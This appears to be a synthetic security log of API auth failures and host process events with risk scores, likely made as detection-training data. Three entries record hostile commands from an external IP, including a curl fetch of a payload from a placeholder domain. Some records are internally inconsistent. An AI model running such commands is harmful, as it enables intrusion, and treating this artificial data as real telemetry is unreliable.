2026-07-02T09:00:19+05:30 | API | service=api-gateway | user=trainer | ip=10.0.0.5 | GET /api/reports/export | status=204 | rt=262ms | risk=safe:10 | msg="GET /api/reports/export 204 in 262ms (next.js: 49ms, application-code: 168ms)"
2026-07-02T15:44:24+05:30 | SYSTEM | service=linux-host | host=app-01 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:86 | msg="process_execution user=admin host=app-01 command="systeminfo" source_ip=185.220.101.45"
2026-07-02T15:44:43+05:30 | API | service=frontend-browser | user=api_bot | ip=10.0.0.8 | GET /api/learning-path-batches | status=404 | rt=833ms | risk=api_route_risk:47 | msg="GET /api/learning-path-batches?level=beginner&limit=50 404 in 833ms (next.js: 100ms, application-code: 730ms)"
2026-07-02T15:44:56+05:30 | SYSTEM | service=linux-host | host=app-02 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:90 | msg="process_execution user=admin host=app-01 command="curl http://unknown-domain.example/payload" source_ip=185.220.101.45"
2026-07-02T15:45:12+05:30 | AUTH | service=mongodb | user=admin | ip=45.67.21.88 | GET /api/verify-admin-access | status=401 | rt=344ms | risk=auth_risk:72 | msg="GET /api/verify-admin-access 401 in 344ms (next.js: 10ms, application-code: 311ms)"
2026-07-02T15:45:28+05:30 | SYSTEM | service=linux-host | host=app-02 | event=process_execution | user=admin | ip=185.220.101.45 | risk=security_risk:97 | msg="process_execution user=admin host=app-01 command="bash -c id" source_ip=185.220.101.45"
2026-07-02T15:45:40+05:30 | AUTH | service=payment-service | user=analyst | ip=198.51.100.42 | GET /api/verify-admin-access | status=401 | rt=383ms | risk=auth_risk:65 | msg="GET /api/verify-admin-access 401 in 383ms (next.js: 67ms, application-code: 332ms)"
2026-07-02T15:46:34+05:30 | AUTH | service=auth-service | user=support | ip=172.16.0.33 | GET /api/auth | status=401 | rt=88ms | risk=auth_risk:63 | msg="GET /api/auth 401 in 88ms (next.js: 5ms, application-code: 66ms)"
2026-07-02T15:46:55+05:30 | AUTH | service=linux-host | user=student01 | ip=172.16.0.33 | GET /api/auth | status=403 | rt=137ms | risk=auth_risk:64 | msg="GET /api/auth 403 in 137ms (next.js: 53ms, application-code: 76ms)"
2026-07-02T15:47:28+05:30 | AUTH | service=windows-host | user=support | ip=88.214.26.18 | GET /api/auth | status=401 | rt=57ms | risk=auth_risk:81 | msg="GET /api/auth 401 in 57ms (next.js: 25ms, application-code: 37ms)"
2026-07-02T15:47:57+05:30 | AUTH | service=nginx | user=guest | ip=192.168.1.10 | GET /api/verify-admin-access | status=403 | rt=464ms | risk=auth_risk:65 | msg="GET /api/verify-admin-access 403 in 464ms (next.js: 35ms, application-code: 428ms)"
2026-07-02T15:48:37+05:30 | AUTH | service=mongodb | user=analyst | ip=192.168.1.11 | GET /api/auth | status=403 | rt=478ms | risk=auth_risk:57 | msg="GET /api/auth 403 in 478ms (next.js: 36ms, application-code: 441ms)"
2026-07-02T15:48:58+05:30 | AUTH | service=nginx | user=hr_user | ip=192.168.1.11 | GET /api/verify-admin-access | status=403 | rt=156ms | risk=auth_risk:73 | msg="GET /api/verify-admin-access 403 in 156ms (next.js: 29ms, application-code: 131ms)"
2026-07-02T15:49:33+05:30 | AUTH | service=firewall | user=support | ip=192.168.1.12 | GET /api/auth | status=401 | rt=254ms | risk=auth_risk:74 | msg="GET /api/auth 401 in 254ms (next.js: 18ms, application-code: 205ms)"
2026-07-02T15:50:00+05:30 | AUTH | service=mongodb | user=hr_user | ip=192.168.1.10 | GET /api/verify-admin-access | status=401 | rt=331ms | risk=auth_risk:69 | msg="GET /api/verify-admin-access 401 in 331ms (next.js: 61ms, application-code: 293ms)"
2026-07-02T15:50:17+05:30 | AUTH | service=firewall | user=admin | ip=198.51.100.42 | GET /api/get-token | status=403 | rt=92ms | risk=auth_risk:82 | msg="GET /api/get-token 403 in 92ms (next.js: 53ms, application-code: 29ms)"
2026-07-02T15:50:32+05:30 | AUTH | service=firewall | user=api_bot | ip=91.240.118.73 | GET /api/get-token | status=401 | rt=120ms | risk=auth_risk:75 | msg="GET /api/get-token 401 in 120ms (next.js: 8ms, application-code: 55ms)"
2026-07-02T15:51:22+05:30 | AUTH | service=scheduler | user=admin | ip=198.51.100.42 | GET /api/get-token | status=401 | rt=36ms | risk=auth_risk:65 | msg="GET /api/get-token 401 in 36ms (next.js: 26ms, application-code: 1ms)"
2026-07-02T15:51:50+05:30 | AUTH | service=firewall | user=trainer | ip=203.0.113.90 | GET /api/auth | status=401 | rt=251ms | risk=auth_risk:60 | msg="GET /api/auth 401 in 251ms (next.js: 52ms, application-code: 194ms)"
2026-07-02T15:52:00+05:30 | AUTH | service=nginx | user=manager | ip=172.16.0.21 | GET /api/get-token | status=401 | rt=85ms | risk=auth_risk:63 | msg="GET /api/get-token 401 in 85ms (next.js: 57ms, application-code: 67ms)"
2026-07-02T15:52:19+05:30 | AUTH | service=load-balancer | user=devops | ip=45.67.21.88 | GET /api/verify-admin-access | status=401 | rt=278ms | risk=auth_risk:56 | msg="GET /api/verify-admin-access 401 in 278ms (next.js: 13ms, application-code: 235ms)"
2026-07-02T15:52:55+05:30 | AUTH | service=payment-service | user=manager | ip=198.51.100.42 | GET /api/auth | status=403 | rt=391ms | risk=auth_risk:58 | msg="GET /api/auth 403 in 391ms (next.js: 14ms, application-code: 342ms)"
2026-07-02T15:53:26+05:30 | AUTH | service=frontend-browser | user=keerthi | ip=192.168.1.12 | GET /api/verify-admin-access | status=403 | rt=413ms | risk=auth_risk:81 | msg="GET /api/verify-admin-access 403 in 413ms (next.js: 20ms, application-code: 346ms)"
2026-07-02T15:54:05+05:30 | AUTH | service=redis | user=student02 | ip=91.240.118.73 | GET /api/verify-admin-access | status=403 | rt=271ms | risk=auth_risk:57 | msg="GET /api/verify-admin-access 403 in 271ms (next.js: 38ms, application-code: 231ms)"
2026-07-02T15:54:37+05:30 | AUTH | service=linux-host | user=devops | ip=192.168.2.15 | GET /api/auth | status=403 | rt=466ms | risk=auth_risk:57 | msg="GET /api/auth 403 in 466ms (next.js: 41ms, application-code: 459ms)"
2026-07-02T15:55:26+05:30 | AUTH | service=redis | user=finance_user | ip=103.14.88.2 | GET /api/verify-admin-access | status=401 | rt=447ms | risk=auth_risk:70 | msg="GET /api/verify-admin-access 401 in 447ms (next.js: 18ms, application-code: 379ms)"
2026-07-02T15:56:02+05:30 | AUTH | service=api-gateway | user=trainer | ip=192.168.1.12 | GET /api/get-token | status=401 | rt=112ms | risk=auth_risk:63 | msg="GET /api/get-token 401 in 112ms (next.js: 58ms, application-code: 54ms)"
2026-07-02T15:56:36+05:30 | AUTH | service=api-gateway | user=trainer | ip=198.51.100.42 | GET /api/auth | status=403 | rt=99ms | risk=auth_risk:77 | msg="GET /api/auth 403 in 99ms (next.js: 45ms, application-code: 73ms)"
2026-07-02T15:57:18+05:30 | AUTH | service=redis | user=guest | ip=45.67.21.88 | GET /api/get-token | status=403 | rt=485ms | risk=auth_risk:72 | msg="GET /api/get-token 403 in 485ms (next.js: 56ms, application-code: 452ms)"
2026-07-02T15:58:13+05:30 | AUTH | service=api-gateway | user=analyst | ip=203.0.113.90 | GET /api/auth | status=401 | rt=433ms | risk=auth_risk:76 | msg="GET /api/auth 401 in 433ms (next.js: 47ms, application-code: 372ms)"
2026-07-02T15:59:05+05:30 | AUTH | service=mongodb | user=devops | ip=88.214.26.18 | GET /api/get-token | status=401 | rt=328ms | risk=auth_risk:60 | msg="GET /api/get-token 401 in 328ms (next.js: 59ms, application-code: 283ms)"
2026-07-02T15:59:54+05:30 | AUTH | service=postgresql | user=hr_user | ip=198.51.100.42 | GET /api/verify-admin-access | status=403 | rt=71ms | risk=auth_risk:66 | msg="GET /api/verify-admin-access 403 in 71ms (next.js: 17ms, application-code: 63ms)"
2026-07-02T16:00:00+05:30 | UNKNOWN | service=unknown | host=db-01 | event=malformed_record | user=None | ip=None | risk=api_route_risk:62 | msg="duplicate-like log entry /api/get-token 401"
2026-07-02T16:00:01+05:30 | AUTH | service=redis | user=hr_user | ip=192.168.1.10 | GET /api/auth | status=403 | rt=380ms | risk=auth_risk:71 | msg="GET /api/auth 403 in 380ms (next.js: 14ms, application-code: 372ms)"
2026-07-02T16:00:24+05:30 | AUTH | service=payment-service | user=keerthi | ip=192.168.1.10 | GET /api/verify-admin-access | status=401 | rt=88ms | risk=auth_risk:61 | msg="GET /api/verify-admin-access 401 in 88ms (next.js: 46ms, application-code: 37ms)"
2026-07-02T16:00:32+05:30 | AUTH | service=linux-host | user=devops | ip=172.16.0.21 | GET /api/get-token | status=403 | rt=92ms | risk=auth_risk:56 | msg="GET /api/get-token 403 in 92ms (next.js: 9ms, application-code: 34ms)"
2026-07-02T16:00:52+05:30 | AUTH | service=worker-service | user=hr_user | ip=103.14.88.2 | GET /api/get-token | status=403 | rt=162ms | risk=auth_risk:66 | msg="GET /api/get-token 403 in 162ms (next.js: 35ms, application-code: 155ms)"
2026-07-02T16:01:00+05:30 | UNKNOWN | service=unknown | host=web-01 | event=malformed_record | user=None | ip=None | risk=api_route_risk:62 | msg="GET /api/profile status missing_response_time"
2026-07-02T16:01:34+05:30 | AUTH | service=linux-host | user=guest | ip=192.168.1.12 | GET /api/verify-admin-access | status=401 | rt=385ms | risk=auth_risk:67 | msg="GET /api/verify-admin-access 401 in 385ms (next.js: 67ms, application-code: 315ms)"
2026-07-02T16:02:00+05:30 | UNKNOWN | service=unknown | host=gateway-01 | event=malformed_record | user=None | ip=999.999.999.999 | risk=api_route_risk:57 | msg="invalid timestamp | user=guest | ip=999.999.999.999"
2026-07-02T16:02:25+05:30 | AUTH | service=windows-host | user=guest | ip=10.0.0.5 | GET /api/verify-admin-access | status=401 | rt=155ms | risk=auth_risk:64 | msg="GET /api/verify-admin-access 401 in 155ms (next.js: 47ms, application-code: 148ms)"
2026-07-02T16:03:00+05:30 | UNKNOWN | service=unknown | host=db-01 | event=malformed_record | user=None | ip=999.999.999.999 | risk=api_route_risk:70 | msg="invalid timestamp | user=guest | ip=999.999.999.999"
2026-07-02T16:03:19+05:30 | AUTH | service=api-gateway | user=analyst | ip=172.16.0.33 | GET /api/verify-admin-access | status=401 | rt=74ms | risk=auth_risk:68 | msg="GET /api/verify-admin-access 401 in 74ms (next.js: 28ms, application-code: 7ms)"
2026-07-02T16:03:45+05:30 | AUTH | service=worker-service | user=support | ip=192.168.1.12 | GET /api/get-token | status=401 | rt=71ms | risk=auth_risk:63 | msg="GET /api/get-token 401 in 71ms (next.js: 26ms, application-code: 29ms)"
2026-07-02T16:04:00+05:30 | UNKNOWN | service=unknown | host=web-01 | event=malformed_record | user=None | ip=999.999.999.999 | risk=api_route_risk:65 | msg="invalid timestamp | user=guest | ip=999.999.999.999"
2026-07-02T16:04:25+05:30 | AUTH | service=windows-host | user=manager | ip=172.16.0.21 | GET /api/auth | status=401 | rt=471ms | risk=auth_risk:57 | msg="GET /api/auth 401 in 471ms (next.js: 39ms, application-code: 423ms)"
2026-07-02T16:05:00+05:30 | UNKNOWN | service=unknown | host=api-01 | event=malformed_record | user=None | ip=None | risk=api_route_risk:66 | msg="GET /api/profile status missing_response_time"
2026-07-02T16:05:18+05:30 | AUTH | service=nginx | user=finance_user | ip=203.0.113.90 | GET /api/get-token | status=401 | rt=31ms | risk=auth_risk:82 | msg="GET /api/get-token 401 in 31ms (next.js: 52ms, application-code: 1ms)"
2026-07-02T16:05:24+05:30 | AUTH | service=nextjs-app | user=student02 | ip=91.240.118.73 | GET /api/auth | status=403 | rt=48ms | risk=auth_risk:78 | msg="GET /api/auth 403 in 48ms (next.js: 7ms, application-code: 1ms)"
2026-07-02T16:06:00+05:30 | UNKNOWN | service=unknown | host=web-01 | event=malformed_record | user=None | ip=None | risk=api_route_risk:60 | msg="GET /api/profile status missing_response_time"
2026-07-02T16:06:19+05:30 | AUTH | service=firewall | user=api_bot | ip=172.16.0.21 | GET /api/auth | status=401 | rt=125ms | risk=auth_risk:59 | msg="GET /api/auth 401 in 125ms (next.js: 18ms, application-code: 108ms)"
2026-07-02T16:07:00+05:30 | UNKNOWN | service=unknown | host=app-01 | event=malformed_record | user=None | ip=None | risk=api_route_risk:51 | msg="GET /api/profile status missing_response_time"
2026-07-02T16:07:01+05:30 | AUTH | service=redis | user=student01 | ip=192.168.1.11 | GET /api/verify-admin-access | status=401 | rt=137ms | risk=auth_risk:65 | msg="GET /api/verify-admin-access 401 in 137ms (next.js: 68ms, application-code: 105ms)"
2026-07-02T16:07:37+05:30 | AUTH | service=windows-host | user=hr_user | ip=172.16.0.21 | GET /api/get-token | status=401 | rt=24ms | risk=auth_risk:63 | msg="GET /api/get-token 401 in 24ms (next.js: 50ms, application-code: 1ms)"
2026-07-02T16:08:00+05:30 | UNKNOWN | service=unknown | host=app-02 | event=malformed_record | user=None | ip=999.999.999.999 | risk=api_route_risk:64 | msg="invalid timestamp | user=guest | ip=999.999.999.999"
2026-07-02T16:08:18+05:30 | AUTH | service=postgresql | user=guest | ip=45.67.21.88 | GET /api/verify-admin-access | status=403 | rt=64ms | risk=auth_risk:70 | msg="GET /api/verify-admin-access 403 in 64ms (next.js: 51ms, application-code: 1ms)"
2026-07-02T16:08:32+05:30 | AUTH | service=linux-host | user=john | ip=10.0.0.5 | GET /api/get-token | status=403 | rt=145ms | risk=auth_risk:62 | msg="GET /api/get-token 403 in 145ms (next.js: 5ms, application-code: 127ms)"
2026-07-02T16:09:00+05:30 | UNKNOWN | service=unknown | host=app-01 | event=malformed_record | user=None | ip=None | risk=api_route_risk:58 | msg="GET /api/profile status missing_response_time"
2026-07-02T16:09:20+05:30 | AUTH | service=auth-service | user=finance_user | ip=198.51.100.42 | GET /api/get-token | status=403 | rt=396ms | risk=auth_risk:65 | msg="GET /api/get-token 403 in 396ms (next.js: 43ms, application-code: 336ms)"
2026-07-02T16:09:53+05:30 | AUTH | service=mongodb | user=trainer | ip=192.168.1.12 | GET /api/auth | status=403 | rt=57ms | risk=auth_risk:66 | msg="GET /api/auth 403 in 57ms (next.js: 32ms, application-code: 49ms)"
2026-07-02T16:10:00+05:30 | UNKNOWN | service=unknown | host=api-01 | event=malformed_record | user=None | ip=None | risk=api_route_risk:59 | msg="MALFORMED_LOG missing timestamp endpoint=/api/payment status=500"
2026-07-02T16:10:14+05:30 | AUTH | service=auth-service | user=devops | ip=192.168.1.11 | GET /api/verify-admin-access | status=403 | rt=317ms | risk=auth_risk:64 | msg="GET /api/verify-admin-access 403 in 317ms (next.js: 8ms, application-code: 305ms)"
2026-07-02T16:11:00+05:30 | AUTH | service=auth-service | user=trainer | ip=198.51.100.42 | GET /api/get-token | status=403 | rt=50ms | risk=auth_risk:78 | msg="GET /api/get-token 403 in 50ms (next.js: 26ms, application-code: 37ms)"
2026-07-02T16:11:00+05:30 | UNKNOWN | service=unknown | host=app-02 | event=malformed_record | user=None | ip=999.999.999.999 | risk=api_route_risk:58 | msg="invalid timestamp | user=guest | ip=999.999.999.999"
2026-07-02T16:11:35+05:30 | AUTH | service=nextjs-app | user=student01 | ip=203.0.113.90 | GET /api/verify-admin-access | status=403 | rt=345ms | risk=auth_risk:72 | msg="GET /api/verify-admin-access 403 in 345ms (next.js: 20ms, application-code: 292ms)"
2026-07-02T16:12:00+05:30 | UNKNOWN | service=unknown | host=api-01 | event=malformed_record | user=None | ip=None | risk=api_route_risk:70 | msg="duplicate-like log entry /api/get-token 401"
2026-07-02T16:12:30+05:30 | AUTH | service=linux-host | user=finance_user | ip=192.168.1.12 | GET /api/verify-admin-access | status=401 | rt=100ms | risk=auth_risk:77 | msg="GET /api/verify-admin-access 401 in 100ms (next.js: 7ms, application-code: 57ms)"
2026-07-02T16:13:00+05:30 | UNKNOWN | service=unknown | host=gateway-01 | event=malformed_record | user=None | ip=None | risk=api_route_risk:43 | msg="MALFORMED_LOG missing timestamp endpoint=/api/payment status=500"
2026-07-02T16:13:16+05:30 | AUTH | service=load-balancer | user=admin | ip=203.0.113.90 | GET /api/get-token | status=401 | rt=282ms | risk=auth_risk:56 | msg="GET /api/get-token 401 in 282ms (next.js: 57ms, application-code: 261ms)"
2026-07-02T16:13:27+05:30 | AUTH | service=firewall | user=manager | ip=103.14.88.2 | GET /api/auth | status=403 | rt=392ms | risk=auth_risk:64 | msg="GET /api/auth 403 in 392ms (next.js: 36ms, application-code: 354ms)"
2026-07-02T16:13:42+05:30 | AUTH | service=mongodb | user=finance_user | ip=192.168.1.10 | GET /api/get-token | status=403 | rt=159ms | risk=auth_risk:80 | msg="GET /api/get-token 403 in 159ms (next.js: 10ms, application-code: 91ms)"
2026-07-02T16:14:00+05:30 | UNKNOWN | service=unknown | host=gateway-01 | event=malformed_record | user=None | ip=999.999.999.999 | risk=api_route_risk:65 | msg="invalid timestamp | user=guest | ip=999.999.999.999"
2026-07-02T16:14:02+05:30 | AUTH | service=mongodb | user=devops | ip=172.16.0.33 | GET /api/get-token | status=403 | rt=311ms | risk=auth_risk:80 | msg="GET /api/get-token 403 in 311ms (next.js: 69ms, application-code: 271ms)"
2026-07-02T16:14:29+05:30 | AUTH | service=redis | user=student01 | ip=10.0.0.5 | GET /api/get-token | status=401 | rt=125ms | risk=auth_risk:77 | msg="GET /api/get-token 401 in 125ms (next.js: 27ms, application-code: 109ms)"
